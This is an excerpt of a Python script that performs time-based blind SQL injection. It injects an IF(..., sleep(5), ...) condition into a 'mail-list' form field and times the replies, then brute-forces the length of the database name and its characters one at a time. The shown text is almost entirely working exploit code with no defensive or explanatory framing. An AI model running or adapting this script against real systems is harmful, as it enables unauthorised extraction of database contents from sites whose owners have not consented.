...
def send_payload(ip, payload):
    ...
    data = {
        'mail-list': f"tom' OR IF({payload}, sleep(5), 'NO') AND '1'='1"  # ---- CHANGE THIS PARAMETER-------
    }
    start = time.time()
...
def brute_db(ip):
    ...
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        if send_payload(ip, f"LENGTH(DATABASE())={i}"):
            length = i
            break
    ...
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            if send_payload(ip, f"SUBSTRING(DATABASE(),{i},1)='{chr(j)}'"):
                db_name += chr(j)
